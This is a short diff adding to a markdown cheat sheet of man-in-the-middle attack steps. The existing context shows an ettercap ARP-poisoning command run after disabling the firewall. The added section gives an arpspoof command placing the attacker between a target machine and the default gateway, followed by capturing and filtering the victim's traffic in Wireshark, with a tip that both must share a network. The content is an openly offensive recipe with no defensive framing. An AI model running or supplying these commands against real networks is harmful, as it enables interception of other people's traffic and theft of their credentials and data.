@@ -25,3 +25,13 @@
 #### 4) ufw disable
 
 #### 5) ettercap -T -i INTERFACE_2 -M arp -F example.ef
+
+# MITM EXAMPLE 2
+ 
+#### 1) sudo arpspoof -i INTERFACE -t TARGET_MACHINE DEFAULT_GATEWAY
+
+#### 2) sudo wireshark (Capture live packets)
+
+#### 3) Filter on wireshark on what traffic you want to capture
+
+## TIP: Attacker and target should be connected in the same network for this to work
